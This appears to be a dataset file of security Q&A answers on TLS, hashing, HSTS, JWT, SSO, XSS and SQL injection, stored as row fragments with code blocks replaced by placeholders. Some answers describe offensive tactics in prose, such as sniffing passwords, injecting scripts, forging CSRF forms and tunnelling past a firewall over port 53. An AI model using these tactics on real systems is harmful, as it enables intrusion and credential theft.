First element is the DH modulus as a big integer, with a two-byte length header. Here, the length is encoded as 01 00, meaning an integer encoded over 0x0100 bytes. That's 256 bytes, so the modulus has length between 2041 and 2048 bits. The modulus bytes follow, in unsigned big-endian order. The top bytes of that modulus are, in this case, ff ff ff ff.... The modulus then has length exactly 2048 bits. Using this method you can also make sure, that your server doesn't use the DH Groups predefined in RFC 3526 (which my Apache2.4.7 using Ubuntu 14.04 still does, although  states that this version should use DH parameters added to the PEM-encoded SSLCertificateFile).",122,349,1,True
23574,"  Since requests directed ultimately to AS112 servers are usually
  triggered automatically by applications, review of firewall logs
  may indicate a large number of policy violations occurring over an
  extended period of time.

  Where responses from AS112 servers are blocked by firewalls, hosts
  will often retry, often with a relatively high frequency.  This
  can cause inbound traffic to be misclassified as a denial-of-
  service (DoS) attack.  In some cases, the source ports used by
  individual hosts for successive retries increase in a predictable
  fashion (e.g. monotonically), which can cause the replies from the
  AS112 server to resemble a port scan.

  A site administrator may attempt to perform active measurement of
  the remote host in response to alarms raised by inbound traffic,
  e.g. initiating a port scan in order to gather information about
  the host which is apparently attacking the site.  Such a scan will
  usually result in additional inbound traffic to the site
  performing the measurement, e.g., an apparent flood of ICMP
  messages that may trigger additional firewall alarms and obfuscate
  the process of identifying the originally problematic traffic.
","Is this a spoofed SYN flood? At first glance, this may look like an attack. An attacker can initiate a SYN Flood without using his real IP address. An attacker crafts a packet with an origin IP of a known IP such as that of a blackhole dns server. Your server may exhaust resources while attempting to respond with a SYN-ACK packet. How can I tell If your server does respond with a SYN-ACK packet, then the original packet is likely spoofed if the server doesn't respond with a final ACK packet. Why am I seeing TCP traffic for DNS? Per A request sent to one of these servers will result in a response being returned to the client.  The response will typically be a UDP datagram, although it's perfectly valid for requests to be made over TCP. In both cases, the source port of packets returning to the site that originated the DNS request will be 53. Explanations provided by RFC6305 Section 6 of  provides further explanations of why you may see this traffic. Inbound Traffic from AS112 Servers Where firewalls or intrusion detection systems (IDSs) are configured    to block traffic received from AS112 servers, superficial review of    the traffic may seem alarming to site administrators. {code-blk}",249,296,2,True

A given server certificate could be amenable to validation through several, possibly many certificate chains.

In the case of cross-certification between distinct CA, the several chains for a given server certificate may even lead to distinct root CA. The consequence is that while the SSL/TLS server is supposed to send a ""valid chain"", that chain may not necessarily be the one that the client would have preferred. In general, SSL/TLS clients will try to validate the server certificate chain as received from the server. If that chain does not please the client, then the client's behaviour depends on the implementation: some clients simply give up; others (especially Windows/Internet Explorer) will try to build another chain using locally known intermediate CA and also downloading certificates from URL found in other certificates (the ""authority information access"" extension).",92,255,1,True

","First, a couple points of clarification. Passwords are typically hashed, not encrypted, as was pointed out above. Plaintext passwords are typically sent to the server for the application to hash and compare against what is in the database. I say typically in both cases, because there are exceptions. For passwords sent to the server, a protocol called SRP can be used to never send the password to the server. But it is not used very often. What can an attacker do? Attacks against hashing algorithms exist, such as the MD5 discussion linked above, that allow the plaintext passwords to be discovered. Common hashing that applications use include: MD5 SHA1 SHA256 SHA512 bcrypt scrypt Tools are out there that build hashes of known words and compare them against the desired hash. For example: I want to know what the plaintext value of this hash is: {code-blk}, as well as encourage the use of strong passwords.",180,219,2,True

","In highly doubt that the password information is really transmitted by the server. Well, assuming that there is in fact such kind of information present: Retrieving this kind of information by sniffing the HTTP transferred data when received or sent. The significant information should be a part of the received data and the sent data. Retrieving the password information from the DOM. I can mention two excellent addons for Firefox to potentially achieve this goal. Tamper Data: to catch the HTTP data Firebug: to look up the DOM and HTML You may face the problem that the password will not be plain text. This may indicate that the data must be decrypted on the client side by some script. Then, there would be only a shot sequence where the information is genuine. Every further security should now depend the verification process on the server side. Even thou this seems to be the best method to guarantee security, a large part of the process depends on the front end so there it is vulnerable. Overall it really depends on the real security sequence used for this process. The best way to grab genuine data is while the client sends the data, assuming there will be no encryption process before the data is sent. I don't believe that HTML itself provides advanced features to handle such kind of data, just hiding the content. But I highly assume that the data is processed by a script on the client side to keep the information secret. This would be the best way to compensate the missing security. Also, the data may be a not the password, but more likely a hash or token. Here is a simple example for your case: {code-blk} Online:  a XSS warning popup may appear.",156,367,1,True

","I try to show both sides of the security spectrum. Security is important, so you shouldn't just know how to defeat security, you should know how to implement it as well. Thus, I'm going to list a prevention first. If you don't want to read this, scroll down. How do I prevent SQL injection? Doubling up apostrophes is not the answer when it comes to security, and it can lead to insecurity. The answer depends on the programming language you're using. For SQL Server / Oracle / MySQL With Java, use CallableStatements and PreparedStatements correctly. With PHP, you'll need the appropriate Prepared Statements. With C#/VB.NET, you'll need parameterized queries. Note that these are all the same concepts in every language. They just have different names. Even with prepared/callable statements or parameterized queries, the following is incorrect: {code-blk}. This is called . Doubling quotes  in older versions of MySQL. Although not really an SQL injection attack, you can try to force the website to inject malicious code to display to their users. You can try inserting script tags (read above for an example). Imagine injecting a drive-by download when people view your page, or a user list. Although not technically an SQL injection attack, you may be able to beat this protection by looking through the console in your browser and checking for integers being sent to the database, and then modify the request.

","Three of the answers presently contributed require lowering the security level of your browser, possibly leaving you open to  if you do this in your primary browser, subsequently use that browser for other web sites, or simply forget to revert this change (or multiple changes). Legacy and insecure SSL/TLS features (SSLv2 and , SHA1RSA signatures,  and 3DES ciphers,  MAC, export ciphers, non PFS ciphers, <1024 DH parameters) are progressively being disabled by default and/or removed from browsers, and for good reason. A separate problem that @AndreKR helpfully flags is that of browser compatibility, in which case a legacy browser in a dedicated VM is probably the most robust solution. If you cannot replace the device, use dedicated VM or a dedicated browser. The next best option is a TLS proxy to allow the use of a contemporary secure browser. Enabling one, (or two, or three ...) insecure features in a browser is not a secure and sustainable solution, and when the inevitable happens and a required feature is removed entirely? (SSLv3 support for , , ). A secure alternative is to proxy the connections through something that supports both old/legacy and new protocols & ciphers, there are many options (including the rather heavyweight solution of an Apache reverse proxy). The following more lightweight solution should work on both *nix and Windows systems. This will require that you generate a key/cert — not necessarily a problem since the next thing that's going to happen is that contemporary browsers will reject SHA1-signed certificates. This way you can use a SHA-2 signed RSA-2048 certificate and contemporary TLS for access to the device.

","The relative costs depend very much on what the vulnerability is.

Note too that simply triggering the bug will generally cause the program to crash: more a denial of service than an exploit. Their coup de grace, a full remote exploit of the Exim mailserver, is a meticulously engineered Rube Goldberg chain that managed to work around the limitations using specific properties of how Exim happens to organize its memory in specific situations.  It's described fully in the , and is too complicated to go into here. Comparison I will admit I'm not sure which bug was harder to find.  Both sat latent in the code for a long time.  Qualys found the Ghost bug ""during a code audit""; Stéphane Chazelas found the Shellshock bug , and an entire series of related bugs were found very quickly once people knew where to look, some with the help of fuzzing tools. However, the question of which was harder to exploit is much easier to answer.  I think it's clear that a very high level of engineering went into finding a way to turn the Ghost bug into a working Exim exploit.

","Yes, it is. By how much, and if it would be ok for you to allow forms depends on your specific situation. CSRF with referer checks If your CSRF protection depends on referer checks, not on a token, allowing forms means that you would be vulnerable to CSRF. As you disallow scripts, a victim would still need to actually click the form, but that can be achieved via social engineering or maybe ClickJacking. For example, an attacker could place a paypal button, which would actually add a new admin user, in the hopes that you click it. Of course, this is also possible with links, but only for GET requests, not for POST requests. CSRF with existing forms It sounds that your filter is a general filter, filtering out all possibly dangerous tags. But there are specific situations where you definitely do not want form tags, eg when echoing user input inside forms. If you eg have a user edit form like this in the admin backend: {code-blk}. If they now get the admin to edit their profile, they would be admin, without the admin wanting to make them admin. Phishing A form could also be used for phishing attacks. This again depends on the specific context where your user input is put, but theoretically, an attacker could for example display a form asking for login credentials, credit card details, etc, and then send them to their own server. The hope is that the victim would not interpret the form as user input, but as belonging to your website.",128,342,1,True

","This is a problem that has been solved by OAuth 2 and Open ID Connect (OIDC). I would strongly suggest building on it rather than inventing your own protocol. Take a look at the . First off, it helps to split authentication from authorization. Authorization is what you want to achieve (i.e. authorizing the TV). Whether the authentication workflow requires login or not, or involves multiple factors is something that should be considered separate from the authorization workflow and may be something you want to be configurable. Diagram below outlines the OAuth 2 device workflow. {code-blk} The auth code can be in QR form that the user scans with the mobile app, or it can simply be a code that the user will have to manually type into their mobile app. In the aforementioned Google link, what they describe as device ID may be the UUID you mentioned, but it could also be a securely generated random string associated with your app. There are guidelines in OAuth 2 and OIDC for utilizing shared secrets, which are only necessary for protecting credentials. In the workflow above since the mobile app is responsible for authentication, it has the option of using a shared secret with the Server (also known as a confidential client) or not (also known as a public client). The question of whether you need authentication depends on where your Server resides. If it is on the internet, authentication is recommended - many OAuth 2 server libraries/applications let you integrate with various social media accounts so this may not be as painful as you'd think. On the other hand if the Server resides in the user's local home network then perhaps authentication is not necessary. There plenty of client and server OAuth 2/OIDC libraries that will make your life easier. For the server side you can even make use of server applications (e.g. ) sporting features such as TOTP to improve security.",123,412,2,True

24292,"You have a message that you want the world to know came from you
You have a public/private key pair that supports signing (RSA, DSA, etc.)
You take a cryptographic hash (usually something like SHA-256) of the message
 - Like asymmetric encryption, signing schemes work best on small bits of data
You create a digital signature of the hash digest (the output of the hash function)
 - This requires your private key
You distribute the message, the signature, and the algorithms (hash and signing) used
Alice has your public key, and wants to confirm that the message is authentic
Alice re-hashes the message, with the same scheme
Alice then uses your public key to turn the signature back into the hash digest
Alice checks if the digest of the message and the digest from the signature match
 - This is called verifying a signature
","First of all, as @WhiteWinterWolf points out, this is a digital signature scheme. Digital signing is specifically for the purpose of making sure that the message is from you, not somebody else, and hasn't been modified since it was signed. Without going into the math, here's how it works: {code-blk} Cryptographic signatures are used all over. They're used in X.509 certificates (like SSL/TLS uses) to verify that the certificate was issued by a trusted authority, and hasn't been tampered with. They're used in secure email, to make sure that the recipient knows the sender of the mail wasn't spoofed. They're used with signed files, usually executable binaries, so that the author of the file is known. That's just a few of the common uses. Now, with that said, let's be clear about something: Encryption, in general, does NOT provide authentication (proof of the identity of the source of the message) or integrity (confirmation that the message has not been tampered with); only confidentiality (also called privacy or secrecy). If you encrypt a message, but don't sign it (or provide some other form of verification), an attacker can take the encrypted message and manipulate it, changing the meaning even though the attacker doesn't know what the original text was. The recipient of the message can then decrypt the message, and may have no idea it was tampered with. For some stuff, this isn't very meaningful; an attacker tweaking English text that they don't know the content of will produce meaningless gibberish. For other things, though, it can matter a lot. Do not rely on encryption to verify where a message comes from! (Caveat: if using an ""authenticated encryption"" scheme, that includes integrity checks and, if nobody else has the key, also provides authentication. You shouldn't assume that encryption provides these things, though; most of the time it doesn't.)",187,459,1,True

","Facebook can be blocked in many ways: On proxy like squid / sslbump mentioned On Firewall and DNS Facebook is using it's own netwo rk ranges and there's more than just Facebook, but all is social essentially like Instagram. You need also to think what to do with ""requests to Facebook"". You can setup a zone on your local DNS server ""facebook.com"" and direct all traffic to dummy server with no webserver on it, so it returns ""connection refused"". This is because when you block on the firewall, this might block web browsers. You need to setup all ""top-level"" facebook domains like ""*.facebook.com, *.fbcdn.net"" and so on. You can also make DNS to not respond anything at all. See the list of Facebook domains: Instead of the DNS, you can make firewall not slowing down browsers by sending ""connection refused"" response by itself. This can be done by doing redirection to local port or to dummy server with no port open. Here's some example but that's not for router, it's for stand-alone host, but it shows that to block website without slowing-down browser you need to tell the browser that the port is closed using TCP/IP and not just ICMP. This can be done by redirecting outgoing port to local port: {code-blk} This is very reliable way of doing it. Some firewalls may be able to block the port in such a way that the redirection is not needed. So you can use both Firewall and DNS (or just the Firewall), or you can use the proxy option.

","Forms-based authentication over proper, validated TLS is the modern way forward for web application authentication that require non-SSO (Single Sign On) capabilities (e.g., SAML, OpenID, OAuth2, FIDO, et al). NTLM authentication is only utilized in legacy networks. Microsoft no longer turns it on by default since IIS 7. Microsoft Domains and/or Forests with a Windows Server 2012 R2  do not even support NTLM authentication by default. Thus, its use is contraindicated. Cleartext authentication, such as via non-SSL/TLS HTTP, will result in compromise of the web app's credentials -- regardless of how strong the NTLM authentication (or other authentication) is, primarily because of Man-in-the Middle (MITM) scenarios, but also for many other credential-collecting reasons (see the  or the  tools). If you want to see what NTLM looks like on the wire (MITM scenario optional), check out this  which states the following: The essential difference between NTLM and NTLMv2 is how the response is calculated. NTLM uses MD4 and DES in a weak way which is well known (5 NULL bytes yada yada yada); NTLMv2 uses HMAC-MD5 based on more than just the password and challenge, which is where the “blob” comes in. So that’s covered off the “challenge”, “HMAC-MD5″ and “blob” that’s missing from the John hash I’m having to build up from scratch. The author then goes on to show an HTTP message with the Wireshark tool. In some scenarios, I believe it is possible to reverse which exact NTLM protocol is in use by just connecting to a HTTP-NTLM authenticating web server. As seen in the book, Network Security Assessment, 3rd Edition: {code-blk} To understand those variables and further HTTP-based NTLM authentication, check out the resources here --  -- as well as in the old presentation on Cracking NTLMv2 Authentication --  (for the different NTLM SSP provider internals)",307,491,4,True

","You can use the same technique as HTTP Digest Authentication (actually you could use exactly that technique, re-using any of several existing libraries). The server send a challenge, the client answers by (e.g.) hashing together the challenge and the secret. The server takes care never to reuse a challenge. Depending on the mechanics of the connection, you might need to re-authenticate the connection at every request. To reduce overhead you might want to use some kind of incremental nonce, i.e. {code-blk} Using HTTP with Digest-Auth this is done automatically. Using plain HTTP you might simply add a header or a parameter to each request. The Server stores the password salted with salt1, hashed. The server sends salt1 and a random (each connection a new) salt2 to the client. The client salts and hashes the password with salt1, salts and hashes the hash from step 1 again with salt2, sends this hash to the server. So to check the password the server has to salt and hash it's stored hash with salt2 and check for equality. This is OK, but it is equivalent to storing the password in the clear. For all intents and purposes, knowing the salt1-ed password is enough to perform a successful login; this means that if one were to gain access to the password database, he could use it as is without needing any decryption. You do have an advantage over storing the passwords in the clear, and this is that this way you needn't worry against password reuse (i.e. the user uses a password which is the same as his password for another service. Anyone gaining access to your database also gains access to this other service).",76,398,3,True

Input (Current Time) : The input time value you'll simply get from your phone, no further interaction with the server is required once you have obtained the secret.

Signing Function : The signing function used is HMAC-SHA1. HMAC stands for Hash-based message authentication code and it is an algorithm that uses a secure one-way hash function (SHA1 in this case) to sign a value. Using an HMAC allows us to verify authenticity - only people knowing the secret can generate the same output for the same input (the current time).

The AP decrypts the packets, transforms them into regular old Ethernet packets and forwards them to the switch.

In other words it does not follow (general) proxy standards (HTTP CONNECT or SOCKS), it simply is an HTTP proxy for GET and POST requests.  It is not a full HTTP proxy implementing HTTP CONNECT which would allow for tunneling connections and bypassing a firewall. In  php proxy uses CURL, more exactly {code-blk} Since it would fail on the same regex match.  And since your firewall only allows HTTP through (and parses it) you cannot use other protocols, e.g. VPN on posrt 80. Extra (more optimistic) note One thing that strikes me is that you can resolve DNS.  Therefore the firewall must allow UDP packets on port 53. And, unless you are using an internal DNS server (and so the DNS resolution is not passing through the firewall), you can get around the HTTP header limitation by running a VPN in udp mode (IPsec) and ""connect"" to port 53.

This is possible but how this is done depends on your programming language and libraries. Most languages make only the common case easy for you (i.e. connect by hostname) and uncommon cases like yours are more complex to implement. For example in Perl you could simply use the following code to connect to a site by IP address, but include the proper SNI extension for the target hostname and also check the certificate against the hostname: {code-blk} How this is done in the language of your choice is off-topic here and on-topic at stackoverflow.com.",71,327,3,True

","(Adding a new answer which should be definitive, leaving the old around as it's useful debug for how we got here.  Credit for pointing to the actual answer in comments goes to @P4cK3tHuNt3R and @dave_thompson_085) Using Wireshark, I am trying to determine the version of SSL/TLS that is being used with the encryption of data between a client workstation and another workstation on the same LAN running SQL Server. You are viewing a connection which uses  (""Tabular Data Stream Protocol""): {code-blk} is the TLS version (TLS 1.2, as per ): The version of the protocol being employed.  This document describes TLS Version 1.2, which uses the version { 3, 3 }.  The version value 3.3 is historical, deriving from the use of {3, 1} for TLS 1.0. So the simple answer to your question, ""determine the version of SSL/TLS"", is ""TLS 1.2"". Now, I've seen varying reports as to whether Wireshark can properly parse TDS packets with encoded TLS.  I think that the answer is what you started with - it will tell you TLS is there, but won't parse the details as it would with a native TLS session. As per , it appears that Microsoft Network Monitor is capable of parsing both levels of encapsulation.  And a comment therein states that  is the newer equivalent of that tool.",83,350,2,True

","The master secret is always used for deriving further key material for a TLS session (and can effectively be seen as session key) in TLS 1.2 and earlier versions. The premaster secret is a result from a key exchange, from this key the master secret is derived. Two key exchange methods are defined: RSA key exchange (). Here, a random value is generated by the client (premaster secret, ) and encrypted using the public key from the server's certificate. The result is sent over the wire in a Client Key Exchange message. Diffie-Hellman (DH) key exchange (). Here, both the server and client send their public values (not from the Certificate!) using the Client and Server Key Exchange messages (Section ). Using their respective private components, they can compute a shared secret which is transformed into a premaster secret. The master secret is  calculated from the premaster secret (together with two random values from the Client and Server Hello messages): {code-blk} As you can see, the premaster secret is essentialy for the initial computation, but can be thrown away after the master secret is calculated. When session resumption is in use, typically the master secret (and not the premaster secret) is stored directly in the TLS session cache. As a closing note, notice that the premaster secret for RSA key exchanges can be found by decrypting the (1) encrypted premaster secret (which was sent over the network) using the (2) private RSA key (which is bound to the certificate and reused for all RSA key exchanges). With the DH key exchange, the premaster secret is calculated from (1) a public value (which was sent over the network) and (2) a private value (which is normally different every time). The private value is then discarded (instead of reused, as in the RSA case). This provides the  property (when done properly without ).",84,423,3,True

In md5 this does not happen so easily. The order matters and you cannot derive any information about the input given the output. Not even the length. So you have to resort to just trying all possibilities until you find one that gives you the right output. If someone has a strong, random, 20-character password, it could take centuries. But most people use passwords like ""horselover49"", ""letmein"" or ""penis"" (though the latter might be too short), which are much easier to crack. The reason everyone's complaining about using md5 is because it's fast. But hashing algorithms are made to be fast. MD5 might be broken for other purposes, but it isn't for password hashing. You just shouldn't use a single pass of any hashing algorithm, be it md5 or sha1 or sha512. Better algorithms, like bcrypt/scrypt/pbkdf2/etc. use a hashing algorithm a million times (among other things). Now instead of being able to run the algorithm once for every guess, you need to run it a million times for each guess. That takes a lot longer, allowing you to try fewer passwords, which better protects weak passwords. So yeah, the same is going to happen as with other breaches that used MD5: lots of passwords will be cracked. But they won't all be cracked and definitely not in linear time.

","Yes, AES-NI accelerates both AES-128 and AES-256, and yes, there is a performance difference between hardware accelerated AES-128 and AES-256, according to : On Ivy Bridge here are the raw numbers for both Cyber-Block-Chaining  (CBC) and XEX-based tweaked-codebook mode with ciphertext stealing (XTS) modes with both 128- and 256-bit keys. Note that for XTS mode, only half the key is used, so XTS-512 essentially utilizes a 256-bit key. {code-blk} We made the following observations: For CBC encryption, we see a 40% improvement for 128-bit keys over 256-bit keys.

For XTS decryption, we see a 30% improvement for 256-bit XTS keys over 512-bit keys. Note that this is raw performance of the AES-NI instruction. In real world, there is disk I/O or network I/O that happens while data is being encrypted/decrypted, which would affect real world performance. Also, I believe the above numbers are for single core performance, in implementations that uses multiple cores, even AES-256 can easily saturate the entire I/O bandwidth of an SSD and most networks.

","Client side validation The validation code you have provided is in JavaScript. That suggests it is code that you use to do the validation on the client. Rule number one of securing webapps is to never trust the client. The client is under the full control of the user - or in this case, the attacker. You can not be sure that any code you send to the client is used for anything, and no blocks you put in place on the client has any security value what so ever. Validation on the client is just for providing a smooth user experience, not to actually enforce any security relevant constraints. An attacker could just change that piece of JavaScript in their browser, or turn scripts off completely, or just not send the file from a browser but instead craft their own POST request with a tool like curl. You need to revalidate everything on the server. That means that your PHP must check that the files are of the right type, something your current code doesn't. How to do that is a broad issue that I think is outside the scope of your question, but  are good places to start reading. You might want to  at your {code-blk} This is not a good strategy. The fact that you mention this in the context of validating file extensions makes me worried that you are just throwing a couple of security related functions at your input hoping it will solve the problem.

Escaping of HTML tags and special characters to prevent XSS needs to be done after the data is retrieved from the database, and how to do it depends on where you insert that data. And so on, and so on. Conclusion I am not saying this to be mean, but you seem to be doing a lot of mistakes here. I would not be surprised if there are other vulnerabilities.

Trawl your logs for Windows Event ID 4768: {code-blk} Will allow us to roll up authentication failures by user and host: Note that the ability to query discrete fields like 'user' and 'host' is dependent upon the SIEM picking logs apart and understanding what means what.  The accessibility of those fields here is a side effect of Splunk automagically parsing the logs for me. Given that your original question dealt with space constraints, it should be pointed out that any database or SIEM solution is going to take more disk space than flat text file logs.  However, if you use such a solution, you'll almost always put it on a separate server for security and space management reasons.

","In general session information is not usually encrypted on the server side. It is generally assumed, as part of the threat model, that if an attacker gains access to the server then they already have everything they need. Session data itself is usually not any more sensitive than the rest of the contents of the database. There are a few options: Store them on the filesystem in plaintext. If your threat model suggests SQLi is more likely than filesystem access, this is an easy move. Encrypt session IDs and data using the database's inbuilt encryption routines. This protects you against cases where a database backup is compromised, but won't protect you against disk theft or an attacker with SQL access. Encrypt your session IDs and session data in the database, using a key set in a config file on the server somewhere. The benefit of this is that the attacker would need access to both the database (e.g. via SQL injection) and the filesystem at the same time in order to decrypt the session IDs and session data. Encrypt session IDs and data using a randomly chosen key which is cached within the server daemon process (e.g. APC or memcached for PHP). This would be exceedingly difficult for an attacker to gain access to without full code execution on the system, but has the downside that all session data would be invalidated if you restart the server process. I recommend the use of authenticated encryption, with separate encryption and authenticity. Pseudocode for encryption is as follows: {code-blk} This provides authenticated encryption to prevent tampering with session data on the server side.",184,360,1,True

Another decisive factor is that not everypage can be sslstripped if you use common browsers on last versions since some years ago... I mean, if you use modern Chrome, Firefox or Internet Explorer for example... these browsers have an internal list of known ssl sites. That sites (like twitter or facebook for example) will never be sslstripped because the browser knows that ALWAYS must look for them using https even if the user did the ""bad way request"" putting facebook.com without specifying the https:// before. I guess these sites pay to the browser's companies to be in that list. There are more advanced techniques to do sslstrip even to pages in that lists... like Delorean attack, or using sslstrip+ also called sslstrip2 which requires dns and proxy etc... but are more complicated.

OpenPGP and thus GPG key blocks include much more than just the raw crypto key; in particular public keys (including this one) almost always are attached to a user-id and carry one or more signatures -- at least a 'self-signature' by the key or its parent, and often signatures by other (trusted) users to form the 'web of trust'. See 11.1 in the linked RFC for an overview. After converting this base64 to binary, {code-blk} in a pubkey packet or a signature packet is OpenPGP's encoding of a pubkey algorithm and 1 is RSA, see section 9.1.

SSH   ---------       -----------------------------
","SSH is not typically considered insecure in and of itself but it is an administrative protocol and some organizations require two or more layers of control to get access to an administrative console. For example connecting via a VPN first then opening an SSH session which connects through that VPN. This simply provides multiple layers of defense in depth and prevents your systems from being directly affected by the latest SSH vulnerabilities. Note: This is NOT a weakness in SSH itself and many organizations will still expose SSH on high TCP ports for use as SFTP servers then have a script move data to and from that system (not allowing the external SSH/SFTP server to connect to the rest of their network). All protocols eventually have vulnerabilities so if you can require the use of two different ones (i.e. IPSEC VPN and SSH) and stay disciplined about remediation efforts when vulnerabilities are discovered then the window of time where known vulnerabilities exist in both protocols at the same time on your network should be very small. Statistically, the requirement for using two protocols should reduce the amount of time where you would have a single protocol exposed with a known vulnerability (assuming you actually patch/remediate vulnerabilities). As a poor text graphic look the following: {code-blk} In the first example when an SSH vulnerability came out there wasn't one for IPSEC and vice versa so there was never a time, in this crude example, where your systems had vulnerabilities at both layers. This defense in depth is what is protecting the system behind these protocols which occasionally may have vulnerabilities. In the second example, SSH by itself, the moment there is a vulnerability, or a password breach, or any number of other issues, an attacker can directly access your vulnerable system during the window of exposure. I would ask if any other administrative protocols are being exposed and if so then you can question the technology bias but most likely you may be in an organization that doesn't allow any administrative protocols to be accessed directly from the Internet.",38,431,1,True

","The term Zero Day or Zero Hour can apply to any type of attack. It's really just a classification given to the time period at which a vulnerability has just been discovered by a person or organization but has not yet been disclosed publically. Some definitions also include the first day or ""Day Zero"" of a vulnerabilities announcement and the race between attackers and defenders to attack or defend their systems when this type of announcement is made. Zero Day attacks are particularly dangerous because for the short time period they haven't been disclosed the attackers can effectively compromise some level of system access across almost all systems which are vulnerable. In some cases, this can give an attacker access to millions of devices or access to lots of sensitive data. Once it has been disclosed publically or there is a known remediation it is no longer considered to be a Zero Day. Note: Some definitions vary here. So there is no ""solution"" to preventing Zero-day attacks as new vulnerabilities and exploits will always be discovered before the remediations to prevent such problems from being exploited can be created. Effectively the holes will always exist before their respective patches. This said there are additional defenses which can be implemented to reduce the risk from certain types of Zero-Day attacks or limit their damage but it is not possible to anticipate all attack vectors. This is really why you want to have multiple security tools because at any given time one layer of defense (one of your security tools can fail or be vulnerable). In other words, if you think of security as a function of time at some point a vulnerability will exist even on the most well-secured networks. If you only have one level of defense protecting your data your security will look like the following: {code-blk} Even though each layer of security gets vulnerabilities from time to time they don't all align for an attacker to get through all three layers. In rare cases, this can happen but statistically multiple layers can provide much better security than one layer by itself.

When your site is accessed over HTTPS with no certificate errors, the browser knows your site is HTTPS capable and will honor the Strict-Transport-Security header. The purpose of HSTS is to tell the client NOT to switch to HTTP once it has accessed a website over HTTPS, and not the other way round. From : HTTP Strict Transport Security (HSTS) is a web security policy mechanism which helps to protect websites against protocol downgrade attacks and cookie hijacking. : A downgrade attack is a form of attack on a computer system or communications protocol that makes it abandon a high-quality mode of operation (e.g. an encrypted connection) in favor of an old, lower-quality mode of operation (e.g. clear text) that is there for backward compatibility with older systems. So a HSTS header isn't used to redirect a new HTTP connection to HTTPS, but rather to prevent a browser from making HTTP requests to an existing HTTPS site. The  plugin on the other hand ensures the web browser makes HTTPS connections to websites that support HTTPS, but are also accessible over HTTP. Many sites on the web offer some limited support for encryption over HTTPS, but make it difficult to use. For instance, they may default to unencrypted HTTP, or fill encrypted pages with links that go back to the unencrypted site.

Likewise, you can have the vendor do the reverse of what I wrote above to send these files to an SFTP server on their end instead of forcing you to use FTP at all.

If you never get HTTP traffic to your site, you can also simply disable listening on port 80 (or whatever you have your HTTP server listening on). If you do get legitimate HTTP traffic, but want to transition it all to HTTPS, you can use rewrite rules or simple redirections to shift the traffic over, and then it'll be affected by the HSTS header for future requests. You'll also want to make sure you've adjusted any links and form submissions within your site to be relative, or to use protocol relative addresses.

Message Signature or MAC Computation) {code-blk} So changing the payload should invalidate the signature. (2) Do NOT encrypt your own JWT!! There is an actual specification that defines how to encrypt JWTs (called JWE): JWE uses authenticated encryption which means that the plaintext is first encrypted and then an integrity check is produced over the ciphertext. You can get more info on what the plaintext looks like from Section 5.1 of above Spec. It is possible to securely store access policies in the payload of your JWT if you use either encrypted or signed formats. You may want to use encrypted if you don't want the client or other parties to have any knowledge of the policy data. If you don't care who can read it and you only care about who can change the values, use signatures only. Remember though that the more security you add, the bigger the performance impact so use your judgement on what is needed. Final note: Key management of the signature and encryptions keys also becomes an important issue for you to consider, because at the end of the day, whoever has access to the keys can decrypt your JWE or modify the signature of your JWS. So make sure you use good safety practices in where you store the actual keys, who has access to them and how they are used and kept in memory.",65,397,1,True

","From : Client XSS occurs when untrusted user supplied data is used to update the DOM with an unsafe JavaScript call. (em mine) Therefore for it to be client XSS, it has to involve updating the DOM. Although, the article goes on to say: DOM Based XSS is simply a subset of Client XSS I believe this is referring to the actual source being from the DOM rather than the server. e.g. {code-blk} Takeaways What is probably important when it comes to XSS is the following: Any type of stored XSS is mostly higher risk than any form of reflected XSS. Browser XSS filters cannot stop them (except if a Content Security Policy is in place and is sufficiently locked down). When an XSS updates the DOM in a reflected XSS attack, this bypasses browser XSS filters too (same caveats in regards to CSP). Server reflected XSS  is less risky as it requires user interaction and there's also a good chance a browser XSS filter will block it.",58,254,4,True

","Being frustrated by DigitalOcean for this topic too, I propose this answer. The reference is section 8 of  that claims, during Diffie-Hellman Key Exchange: First, the client sends the following: {code-blk} Basically, during , client creates key ""e"" from its secret key ""x""; server will do the same with ""f"" from ""y"". With ""x"" and ""f"" (client) or ""y"" and ""e"" (server), the encryption secret key ""K"" is computed on both sides (I let you look at Diffie-Hellman magic). Then the trick comes :) A big computation is done on both side: ""H"". Which is a hash of a long string including many stuff like e, f, name of server ""V_S"", name of client ""V_C"", previous messages content (""SSH_MSG_KEXINIT"" from client/server = ""I_C""/""I_S""), public server key ""K_S"" and, last but not least, the secret key K: H = hash(V_C || V_S || I_C || I_S || K_S || e || f || K) H is not explicitly provided to client since it knows all of this information and hence can compute it too; but rather, server provides signature of H, computed with server private key. Client can then check this signature thanks to its own computation of H and public key K_S to authenticate the server. The main point IMHO is to mix -at least- K (secret) and signature: no MitM can masquerade such a message!",37,381,2,True

The data actually signed is known by client and server and thus not re-sent (it's spaces, a context string, a zero byte and the previous messages).

Alice encrypts the hash using her encryption key (her private key). Bob (server) knows, from a previous message: Alice's public certificate and the certificate chain. Alice sends to Bob: signature, hash function and signature algorithm. Bob hashes the data. Bob decrypts the signature using Alice's public certificate. Bob compares the two results; if they match, Bob has the proof that the signature is associated with the data and Alice's private key generated the signature.

When secret keys of an appropriate size are used, an approximation of the strength of each of the Diffie-Hellman groups is provided in the table below.

","A lot of SSO systems work this way. But there's a bit more to it than just a couple of lines of code, specifically: use cookies for sessions with the usual httponly and secure flags when a request for an authenticated service is received but without a valid session, redirect the user to the SSO (this needs some special handling around POST and DELETE/PUT/PATCH if used) if a session already exists on the SSO or the user passess authentication, redirect the user back to a special landing page in the application with a token in the URL (because that's the only polite way to get data across domains) at the landing page, establish a link back to the session, set the sesison cookie and redirect to the originally requested page (note that some older browsers ignored cookies set in a 302 response) HTTPS [...] helps prevent anyone listening in on traffic from getting this URL, correct? The key word here is ""helps"". It doesn't prevent the URL from appearing in the history. so how short should the sessions be? Trying to fix an issue of leaking the session cookie by shortening the session timeout is not the right way to go. A better approach is to have the SSO send back a single use token which the application can then use to resolve the session or authenticate access to the session, e.g. (on the SSO) {code-blk} An alternative way to resolve / validate the token would be to make a direct HTTP call from the landing page back to the SSO (i.e. server to server, not via the browser) and ask it to resolve the SID based on the toekn received from the browser.",398,383,1,True

","What you want to achieve is to enforce some security to /private/ and otherwise serve content freely. Login page shall be outside private. Servers who handle path based security know how to handle the escapes. What they look for is to bring both the path and the pattern to a ""canonical"" form. This way, they make sure that they compare slash with slash and not with it's URL escape. Usually declarative security beats programmed security. This implies that testing path is done in a single place, outside the application, in a 3rd party library written with security in mind. Odds are that the ones who wrote the library were aware about the fact that an URL may contain escapes. Another advantage of declarative security is that it doesn't clutter the code so much. We will not have things like: {code-blk} A distracted programmer may forget the check for one single action. Rather, have an annotation system of ""actions"" that will be checked by a caller.

